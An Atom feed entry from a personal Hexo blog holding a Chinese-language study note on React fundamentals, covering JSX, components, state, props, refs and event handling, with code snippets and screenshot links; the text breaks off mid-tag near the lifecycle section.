<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>【W】</title>
  
  
  <link href="https://0410wzn.top/atom.xml" rel="self"/>
  
  <link href="https://0410wzn.top/"/>
  <updated>2022-02-08T01:58:17.386Z</updated>
  <id>https://0410wzn.top/</id>
  
  <author>
    <name>W</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>React（一）</title>
    <link href="https://0410wzn.top/2022/02/02/React%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://0410wzn.top/2022/02/02/React%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2022-02-02T13:54:07.000Z</published>
    <updated>2022-02-08T01:58:17.386Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="React（一）"><a href="#React（一）" class="headerlink" title="React（一）"></a>React（一）</h1><h2 id="第一章-React基础"><a href="#第一章-React基础" class="headerlink" title="第一章    React基础"></a>第一章    React基础</h2><h3 id="React简介"><a href="#React简介" class="headerlink" title="React简介"></a>React简介</h3><h4 id="What"><a href="#What" class="headerlink" title="What"></a>What</h4><ul><li> 用于构建用户界面的JS库 （操作DOM呈现页面，也即只关注界面）</li><li> 将数据渲染为HTML视图的开源JS库</li></ul><h4 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h4><p>原生的缺点：</p><ul><li><p>原生JS操作DOM频繁，效率低 （DOM — API操作UI）（尽管jQuery通过包装减少了代码量的书写，但在效率上没有任何提升）</p></li><li><p>使用JS直接操作DOM，浏览器会进行大量重绘重排</p></li><li><p>原生JS没有组件化编码方案，代码复用率低</p><blockquote><p>模块化 —— 将JS的根据作用分成对应功能的模块</p></blockquote></li></ul><p>React的特点：</p><ul><li> 采用组件化模式、声明式编码，提高开发效率及组件复用率</li></ul><blockquote><p>命名式 与 声明式</p></blockquote><ul><li>在<code>ReactNative</code>中可以使用React语法进行移动端开发</li><li>  使用虚拟DOM + 优秀的Diffing算法，尽量减少与真实DOM的交互</li></ul><p>如下图所示，原生JS缺少代码复用，当你想改变页面中的某些元素时，结果往往是使用新的DOM将以前的完整覆盖掉，而以前的数据并没有派上用场</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/IMG_0087.PNG" alt="IMG_0087"></p><p>原生JS实现</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/F3A6B2F5422143F03CC64B9BF37CAE96.png" alt="F3A6B2F5422143F03CC64B9BF37CAE96"></p><p>React实现</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/D015342A860D3CC92E1DFB6ADFD31F49.png" alt="D015342A860D3CC92E1DFB6ADFD31F49"></p><h4 id="How"><a href="#How" class="headerlink" title="How"></a>How</h4><p>前置知识：判断this的指向、class、ES6语法规范、npm包管理器、原型&amp;&amp;原型链、数组常用方法、模块化</p><hr><h3 id="Hello-React"><a href="#Hello-React" class="headerlink" title="Hello React"></a>Hello React</h3><p>我们以实例作为引入React知识点的例子，这里我们用到三个react的js，分别是<code>babel.min</code>、<code>react.development</code>和<code>react-dom.development</code>，</p><p><code>babel</code> 在ES6中起到的作用是转码，即将ES6转换为ES5，而在react中起到的作用是将jsx转换为js（浏览器无法直接识别jsx文件） </p><p><code>react.development</code>是react核心库，</p><p><code>react-dom.development</code>是react扩展库，用来操作dom</p><p>我们写下以下代码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201102626707.png" alt="image-20220201102626707"></p><p>进入chorme调试</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201102652446.png" alt="image-20220201102652446"></p><p>这里的警告，说明咱们的目前的入门写法存在一些问题，即当我们使用浏览器加载此文档时，浏览器发现了babel，就会立刻进行翻译，而如果jsx的代码繁多且复杂时，耗费的时间会非常长，这种状况不适合于大型开发中，至于开发中如何去做，会在下文中予以解决</p><hr><h3 id="虚拟DOM的两种创建方法"><a href="#虚拟DOM的两种创建方法" class="headerlink" title="虚拟DOM的两种创建方法"></a>虚拟DOM的两种创建方法</h3><ul><li><p>使用<strong>jsx</strong>创建虚拟DOM（同上）</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201103919154.png" alt="image-20220201103919154"></p></li><li><p>使用<strong>js</strong>创建虚拟DOM</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201104434857.png" alt="image-20220201104434857"></p></li></ul><p>我们一般更喜欢使用<strong>jsx</strong>，因为当我们需要创建一个多层嵌套的标签时，如果使用<strong>js</strong>，我们需要在<code>createElement</code>中多次调用它自己，使代码变得冗长<del>且没味</del>，而使用<strong>jsx</strong>只需如下图所示</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201104923955.png" alt="image-20220201104923955"></p><p>或者是</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201105116868.png" alt="image-20220201105116868"></p><hr><h3 id="虚拟DOM与真实DOM"><a href="#虚拟DOM与真实DOM" class="headerlink" title="虚拟DOM与真实DOM"></a>虚拟DOM与真实DOM</h3><p>关于虚拟DOM：</p><ul><li> 本质是Object类型的对象（一般对象）</li><li> 虚拟DOM比较”轻“，真实DOM比较”重“，因为虚拟DOM使React内部在用，无需真实DOM上那么多属性</li><li> 虚拟DOM最终会被React转化为真实DOM，呈现在页面上</li></ul><hr><h3 id="jsx语法规则"><a href="#jsx语法规则" class="headerlink" title="jsx语法规则"></a>jsx语法规则</h3><ul><li><p> 全称: JavaScript XML</p><blockquote><p>XML早期用于存储和传输数据，后来存储和传输数据使用JSON</p></blockquote></li><li><p>react定义的一种类似于XML的JS扩展语法: JS + XML本质是**React.createElement(component, props, …children)**方法的语法糖</p></li><li><p> 作用: 用来简化创建虚拟DOM </p></li></ul><p>​            写法：<strong>var</strong> <strong>ele</strong> <strong>=</strong> Hello JSX!</p><p>​                 注意1：它不是字符串, 也不是HTML/XML标签</p><p>​                 注意2：它最终产生的就是一个JS对象</p><ul><li><p>标签名任意: HTML标签或其它标签</p></li><li><p> 标签属性任意: HTML标签属性或其它</p></li><li><p> 基本语法规则</p></li></ul><p>​            遇到 &lt;开头的代码, 以标签的语法解析: html同名标签转换为html同名元素, 其它标签需要特别解析</p><p>​            遇到以 { 开头的代码，以JS语法解析: 标签中的js表达式必须用{ }包含</p><ul><li> babel.js的作用</li></ul><p>​            浏览器不能直接解析JSX代码, 需要babel转译为纯JS的代码才能运行</p><p>​            只要用了JSX，都要加上type=”text/babel”, 声明需要babel来处理</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201112334780.png" alt="image-20220201112334780"></p><hr><h3 id="何为JS表达式"><a href="#何为JS表达式" class="headerlink" title="何为JS表达式"></a>何为JS表达式</h3><p>要注意区分：【js语句(代码)】与【js表达式】</p><ol><li><p>表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方</p><blockquote><p>以下都是表达式：（都有返回值）</p><p>(1) a</p><p>(2) a + b</p><p>(3) demo(1)</p><p>(4) arr.map()    //map方法用于加工数组    </p><p>(5) function  test() {}</p></blockquote></li><li><p>语句（代码）：</p><blockquote><p>下面这些都是语句（代码）：（控制代码走向。没有值）</p><p>(1) if () {}</p><p>(2) for () {}</p><p>(3) switch () {case: xxxx}</p></blockquote></li></ol><p> 以下是一个遍历的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">const</span> data = [<span class="string">&#x27;Angular&#x27;</span>, <span class="string">&#x27;React&#x27;</span>, <span class="string">&#x27;Vue&#x27;</span>]</span><br><span class="line"><span class="comment">//下面有一些可能出错的地方——index，我们在接下来也会j</span></span><br><span class="line"><span class="keyword">const</span> VDOM = &#123;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>遍历！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">    &#123;</span></span><br><span class="line"><span class="xml">    data.map((item, index) ==&gt; &#123;</span></span><br><span class="line"><span class="xml">                return <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span> = <span class="string">&#123;index&#125;</span>&gt;</span>&#123;item&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">            &#125;)</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>遍历中，列表中的每一个元素都要有一个唯一值key</p><hr><h3 id="组件与模块＆＆模块化与组件化"><a href="#组件与模块＆＆模块化与组件化" class="headerlink" title="组件与模块＆＆模块化与组件化"></a>组件与模块＆＆模块化与组件化</h3><ul><li><p>模块  </p><blockquote><p> 理解：向外提供特定功能的js程序，一般就是一个js</p><p> 为什么要拆成模块：随者业务逻辑增加，代码越来越 多且复杂</p><p>作用：复用js，简化js的编写，提高js运行效率  </p></blockquote></li><li><p>组件  </p><blockquote><p> 理解：用来实现局部功能效果的代码和资源的集合(html/css/js/image )等等 </p><p> 为什么：一个界面的功能更复杂 </p><p> 作用：复用编码，简化项目编码，提高运行效率  </p></blockquote></li><li><p>模块化  </p><blockquote><p> 当应用的 js 都以模块来编写的,这个应用就是一个模块化的应用  </p></blockquote></li><li><p>组件化  </p><blockquote><p> 当应用是以名组件的方式实现，这个应用就是一个组件化的应用 </p></blockquote></li></ul><hr><h2 id="第二章-React面向组件编程"><a href="#第二章-React面向组件编程" class="headerlink" title="第二章    React面向组件编程"></a>第二章    React面向组件编程</h2><h3 id="函数式组件"><a href="#函数式组件" class="headerlink" title="函数式组件"></a>函数式组件</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201145146419.png" alt="image-20220201145146419"></p><p>此时，组件内部的this是undefined，其原因是，当babael翻译完代码之后，会开启严格模式，禁止自定义函数里的this指向window</p><blockquote><p>执行了React.render(<MyComponent>……)之后，发生了什么？</MyComponent></p><p>​    1.React解析组件标签，找到了MyComponent组件</p><p>​    2.发现组件是使用函数定义的，随后调用该函数，将返回的虚拟DOM转换为真实</p><p>​        DOM，随后呈现在页面中</p></blockquote><hr><h3 id="类的复习"><a href="#类的复习" class="headerlink" title="类的复习"></a>类的复习</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201165412378.png" alt="image-20220201165412378"></p><hr><p><code>p1.speak.call(&#123;a:1, b:2&#125;)</code>，call有一个重要的功能，即是更改函数里的this指向，而这时由于没有a、b，this的值就是undefined</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220201171906269.png" alt="image-20220201171906269"></p><p>super必须第一个用欧~</p><p><strong>总结</strong></p><ul><li>类中的构造器不是必须要写的，要对示例进行一些初始化操作，如添加指定属性时才写</li><li>如果A类继承了B类，且A类中写了构造器，那么A类构造器中的super是必须要调用的</li><li>类中所定义的方法，都是放在了类的原型对象上</li></ul><hr><h3 id="类式组件"><a href="#类式组件" class="headerlink" title="类式组件"></a>类式组件</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220202093028922.png" alt="image-20220202093028922"></p><blockquote><p>执行了React.render(<MyComponent>……)之后，发生了什么？</MyComponent></p><p>​    1.React解析组件标签，找到了MyComponent组件</p><p>​    2.发现组件是使用类定义的，随后new出来该类实例，并通过该实例调用到原型的render方法    </p><p>​    3.将render返回的虚拟DOM转为真实DOM，随后呈现到页面中</p></blockquote><hr><h3 id="简单组件-amp-amp-复杂组件"><a href="#简单组件-amp-amp-复杂组件" class="headerlink" title="简单组件 &amp;&amp; 复杂组件"></a>简单组件 &amp;&amp; 复杂组件</h3><p>如果组件是有状态(state)的，就是复杂组件，反之则为简单组件</p><p>那么，什么是state？</p><hr><h3 id="组件实例的三大属性之一-—-state"><a href="#组件实例的三大属性之一-—-state" class="headerlink" title="组件实例的三大属性之一 — state"></a>组件实例的三大属性之一 — state</h3><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>人</td><td>状态</td><td>影响</td><td>行为</td></tr><tr><td>组件</td><td>状态</td><td>驱动</td><td>页面</td></tr></tbody></table><hr><h4 id="React中的事件绑定"><a href="#React中的事件绑定" class="headerlink" title="React中的事件绑定"></a>React中的事件绑定</h4><p>我们先来看一下原生的绑定方式</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220202104346136.png" alt="image-20220202104346136"></p><p><strong>React中，三种方法都可以，推荐第三种</strong></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220202105448711.png" alt="image-20220202105448711"></p><hr><h4 id="类中方法this的指向"><a href="#类中方法this的指向" class="headerlink" title="类中方法this的指向"></a>类中方法this的指向</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220202112639924.png" alt="image-20220202112639924"></p><p>要想解决此问题，可以添加如下图25行的语句</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220202113217130.png" alt="image-20220202113217130"></p><p><code>this.changWeather.bind(this)</code>，<code>this.changWeather</code>找到了原型中的changeWeather函数，而<code>bind</code>有两个作用，一个是生成新的函数，另一个是修改this的指向，而传入的this（构造器中的this），就是Weather的实例对象</p><hr><h4 id="setState"><a href="#setState" class="headerlink" title="setState"></a>setState</h4><p>我们使用内置API来更改状态（state）</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220202120129739.png" alt="image-20220202120129739"></p><p><strong>简写</strong></p><p>我们自己写的函数，大部分都是作为回调函数起到交互作用，他们的this都不是指向实例函数的，当我们想引用大量回调函数时，免不了大量使用bind进行this的转移</p><p><strong>而类中可以直接写赋值语句，其意为，向对应的实例对象中添加一个名x值x的属性（第22行）</strong></p><p><strong>箭头函数本身没有this，但在其中使用this并不会报错，而是会找其外层函数的this来使用（第29行）</strong></p><p>这样，我们便无需使用构造器了</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203083816972.png" alt="image-20220203083816972"></p><hr><h4 id="state总结"><a href="#state总结" class="headerlink" title="state总结"></a>state总结</h4><p>1.理解：</p><ul><li><p>state是组件对象最重要的属性, 值是对象(可以包含多个key-value的组合)</p></li><li><p>组件被称为”状态机”, 通过更新组件的state来更新对应的页面显示(重新渲染组件)</p></li></ul><p>2.注意：</p><ul><li><p>组件中render方法中的this为组件实例对象</p></li><li><p>组件自定义的方法中this为undefined，如何解决？</p></li></ul><p>​            （1） 强制绑定this: 通过函数对象的bind()</p><p>​            （2）箭头函数</p><ul><li>状态数据，不能直接修改或更新</li></ul><hr><h3 id="组件实例的三大属性之一-—-props"><a href="#组件实例的三大属性之一-—-props" class="headerlink" title="组件实例的三大属性之一 — props"></a>组件实例的三大属性之一 — props</h3><p>当我们想从外部获取信息，而不是从内部状态中读出来的，这时我们就不能使用state了，就比如以下状态</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203085453732.png" alt="image-20220203085453732"></p><p>当我们想显示上述状态时</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203085527908.png" alt="image-20220203085527908"></p><p>我们需要多次渲染，这么写未免有些麻烦，React给我们提供了props属性，使用方法如下</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203090341458.png" alt="image-20220203090341458"></p><p>也可以先解构赋值，减少代码的书写量</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203090628148.png" alt="image-20220203090628148"></p><hr><h4 id="批量传递props"><a href="#批量传递props" class="headerlink" title="批量传递props"></a>批量传递props</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203093739383.png" alt="image-20220203093739383"></p><p>为什么能用{…p}的形式展开一个对象？在下一个模块我们来分析这个问题</p><hr><h4 id="…-—-展开运算符"><a href="#…-—-展开运算符" class="headerlink" title="… — 展开运算符"></a>… — 展开运算符</h4><p>展开运算符可以展开数组，但是不能展开一个对象</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203093220382.png" alt="image-20220203093220382"></p><p>可以看到，{…p}本来是起到复制作用的，但是React和bable使其具有了展开对象的作用，需要注意的是，这种作用仅仅限于标签的传递</p><hr><h4 id="对props进行限制"><a href="#对props进行限制" class="headerlink" title="对props进行限制"></a>对props进行限制</h4><p>在下图中，我们可以看见两种对对象传入age的格式（第一种必须加引号，否则会构成语法错误）</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203093804517.png" alt="image-20220203093804517"></p><p>当我们相对所有页面元素加一时</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203093947740.png" alt="image-20220203093947740"></p><p>如果这样操作，只有第二种方式成功加一，而第一种方式的数字则只进行了字符串拼接，而如果第一种想传入数字，而非字符串，应该使用</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ReactDOM.render(&lt;Person name = &quot;秦&quot; age = &#123;18&#125; sex = &quot;男&quot; /&gt;, document.getElementById(&#x27;test1&#x27;))</span><br></pre></td></tr></table></figure></blockquote><p>在此时，我们可以通过propTypes，向创建者 — Person，添加一些“要求”，或者说，“规则”</p><p>需要注意的是，要注意分清<code>propTypes</code>和<code>PropTypes</code>，前者可以认为是React里的一个规矩，后者是一个内置的属性</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203100210377.png" alt="image-20220203100210377"></p><p>需要注意的是，在15版本之后，这个属性单独作为一个库存在，使用需引入，并且不用写React</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203100931318.png" alt="image-20220203100931318"></p><p>如果要求必须加某一项，就在后面写required</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name: PropTypes.string.isRequired</span><br></pre></td></tr></table></figure></blockquote><p>同时，如果指定要求为函数时，为避免与<code>function</code>关键词冲突，应使用<code>func</code></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">speak: PropTypes.func</span><br></pre></td></tr></table></figure></blockquote><p>指定默认值如下dexxx</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203101251452.png" alt="image-20220203101251452"></p><hr><h4 id="props的简写方式"><a href="#props的简写方式" class="headerlink" title="props的简写方式"></a>props的简写方式</h4><p>props是只读的，因此我们想直接通过如<code>this.props.name = &#39;jack&#39;</code>，这样进行更改，是错误的！！！</p><p>我们可以把限制塞进类里</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203103042946.png" alt="image-20220203103042946"></p><hr><h4 id="类式组件中的构造器与props"><a href="#类式组件中的构造器与props" class="headerlink" title="类式组件中的构造器与props"></a>类式组件中的构造器与props</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220203103925102.png" alt="image-20220203103925102"></p><p>通过上述学习我们知道，constructor完全可以用 = 和 箭头函数 替代，而当我们使用constructor时，如果不传入props，其中的this.props就没有接到对象，我们也就不能通过 实例.props 修改值了，即<strong>构造器是否接收props，是否传递给super，取决于：是否希望在构造器中通过this访问props</strong></p><hr><h4 id="函数式组件与使用props"><a href="#函数式组件与使用props" class="headerlink" title="函数式组件与使用props"></a>函数式组件与使用props</h4><p>对于函数function，由于没有实例，所以理论上三个实例属性(state/props/rerfs)都不能使用，但是，props可以使用，其原因在于，函数可以接收参数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span> (<span class="params">props</span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> &#123;name, age, sex&#125; = props</span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>姓名：&#123;name&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">        <span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>性别：&#123;sex&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">        <span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>年龄：&#123;age&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">        &lt;ul&gt;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="props总结"><a href="#props总结" class="headerlink" title="props总结"></a>props总结</h4><p>理解</p><ul><li>每个组件对象都会有props(properties的简写)属性</li><li>组件标签的所有属性都保存在props中</li></ul><p>作用</p><ul><li><p>通过标签属性从组件外向组件内传递变化的数据</p></li><li><p>注意: 组件内部不要修改props数据-</p></li></ul><hr><h3 id="组件实例的三大属性之一-—-ref"><a href="#组件实例的三大属性之一-—-ref" class="headerlink" title="组件实例的三大属性之一 — ref"></a>组件实例的三大属性之一 — ref</h3><h4 id="字符串型的ref"><a href="#字符串型的ref" class="headerlink" title="字符串型的ref"></a>字符串型的ref</h4><p>当我们引用标签之前，在原生JS中，往往会给对应的标签打上id，如下图所示</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220204101228434.png" alt="image-20220204101228434"></p><p>而在React中，我们也可以向ref中写入</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220204102116411.png" alt="image-20220204102116411"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220204102148815.png" alt="image-20220204102148815"></p><p>可以发现，refs中被写入了类似于id的“特征”，分别代表了其对应的标签，而此时，我们也可以通过refs使用标签，同时我们也可以使用解构赋值来减少代码书写量</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220204102926911.png" alt="image-20220204102926911"></p><p>ref收集的不是虚拟DOM，而是其在转成真实DOM之后对应的标签</p><hr><h4 id="回调形式的ref"><a href="#回调形式的ref" class="headerlink" title="回调形式的ref"></a>回调形式的ref</h4><p>上面我们通过由id到ref的方式简单介绍了ref，但很遗憾的是，因为存在的效率问题，直接使用字符串形式的ref目前已经不被官方推荐使用了，甚至在将来可能被废弃掉（官方文档明确说明了“未来版本可能移除”），因此，我们还要学习两种ref的使用方式</p><p>我们将ref改写为回调函数形式，<code>ref=()=&gt;&#123;console.log(&#39;@&#39;)&#125;</code>，发现回调函数确实执行了，在打印台上输出了‘@’，那么，这个回调函数是否接到了参数，这个参数又是什么？</p><p>打印一下</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220204104004901.png" alt="image-20220204104004901"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220204104230319.png" alt="image-20220204104230319"></p><p>可以发现，它的参数正是ref所处的节点</p><p>因此我们可以这样写</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220204105320516.png" alt="image-20220204105320516"></p><p>当实例调用<code>render</code>时会触发我们写的回调函数<code>ref</code>，并在调用时将当前所处的节点传了进去</p><p>而<code>(currtentNode)=&gt;&#123;this.input = currtentNode&#125;</code>（currentNode - 当前节点），指的是，把节点放到组件实例自身上（<strong>这里的this，由于箭头函数本身没有this，而是会找其外层函数的this来使用，所以这里的this就是render的this，即组件的实例对象</strong>），给其起名为<code>input1</code></p><p>当箭头函数左侧只有一个参数，小括号可以不要；右侧只有一句函数体，花括号可以不要，最终如下所示</p><blockquote><p>ref={c =&gt; this.input = c}</p></blockquote><p>因此在我们取用ref时，不从ref自身取，而是在其被存放的实例对象上取用，最终成品如下</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220204110023666.png" alt="image-20220204110023666"></p><hr><h4 id="回调形式ref调用次数的问题"><a href="#回调形式ref调用次数的问题" class="headerlink" title="回调形式ref调用次数的问题"></a>回调形式ref调用次数的问题</h4><p>先参考官网文档</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220204110525605.png" alt="image-20220204110525605"></p><p>这里给一个内联函数的例子</p><blockquote><p>ref={(currentNode)=&gt;{this.input1 = currentNode; console.log(‘@’, currentNode);}}</p></blockquote><p>控制台输出：（注意的是，页面渲染时的那次不算跟更新）</p><blockquote><p>第一次调用：@ null    —    清空动作</p><p>第二次调用：@ 标签</p></blockquote><p>jsx怎样注释？</p><blockquote><p> {/* …… */}</p></blockquote><p>那么正确的形式该怎样写呢？</p><p>修改ref</p><blockquote><p>ref={this.saveInput}    </p></blockquote><p>同时</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220204111856463.png" alt="image-20220204111856463"></p><hr><h4 id="createRef的使用"><a href="#createRef的使用" class="headerlink" title="createRef的使用"></a>createRef的使用</h4><p>我们可以通过方法创建一个容器，并把标签“塞到”里面</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220204112911712.png" alt="image-20220204112911712"></p><p>由于每个容器是”专人专用“的，所以后放入的，会把前面的顶掉，所以针对不同的标签，要用不同的容器进行存取</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220204112703464.png" alt="image-20220204112703464"></p><p>可以看到<code>input</code>存储在容器中，我们要想调用它，应该这样写</p><blockquote><p>alert(this.myRef.current.value)</p></blockquote><hr><h3 id="React中的事件处理"><a href="#React中的事件处理" class="headerlink" title="React中的事件处理"></a>React中的事件处理</h3><p>（1）通过<strong>onXxx</strong>属性指定事件处理函数（注意大小写！）</p><p>​            a.    React使用的是自定义（合成）事件，而非原生的DOM事件</p><p>​            b.    React中的事件是通过事件委托方式处理的（委托给组件最外层的元素）</p><p>（2）通过<code>event.target</code>得到发生事件的DOM元素对象 （**<font color="red">请勿过度使用ref</font>**）</p><hr><h3 id="受控组件与非受控组件"><a href="#受控组件与非受控组件" class="headerlink" title="受控组件与非受控组件"></a>受控组件与非受控组件</h3><p>页面中所有输入类的DOM，随着输入，就能把内容维护到状态中去。这就是受控</p><p>而“现用现取”，就是非受控</p><hr><h3 id="EXP-高阶函数-amp-amp-函数柯里化"><a href="#EXP-高阶函数-amp-amp-函数柯里化" class="headerlink" title="EXP    高阶函数 &amp;&amp; 函数柯里化"></a>EXP    高阶函数 &amp;&amp; 函数柯里化</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220205102957171.png" alt="image-20220205102957171"></p><p><strong>例子：</strong></p><p>当我们将表单中的数据添加到state时，一个一个写未免过于麻烦，过于重复，因此可以使用如下方式</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220205102224284.png" alt="image-20220205102224284"></p><p>可以发现，下面的onChange调用的是saveFormData返回的对象，而为了使它正常工作，我们选择将调用函数的返回值也设置为一个函数，这样onChange最终还是调用到了函数</p><p>在这里还有个细节需要注意</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220205102512952.png" alt="image-20220205102512952"></p><p>这里的”dataType”，如果不加中括号，仅仅会在state中新建一个dataType，而不会获取其内容</p><hr><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p>挂载（mount）：组件放到页面</p><p>卸载（unmount）：组件被移除</p><h4 id="引入生命周期"><a href="#引入生命周期" class="headerlink" title="引入生命周期"></a>引入生命周期</h4><p>我们以本题为例</p><p>需求：</p><p>1.&lt;h2&gt;内容规律变浅，消失后出现</p><p>2.点击&lt;button&gt;，组件消失</p><hr><p><strong>如何卸载一个组件？</strong></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220207094517458.png" alt="image-20220207094517458"></p><hr><p><strong>实现需求</strong></p><p>如果将定时器设置在render里，定时器会发生嵌套，变化速度越来越快，占用越来越多，我们先折中一下，再布置一个按钮，将需求先完成</p><p><img 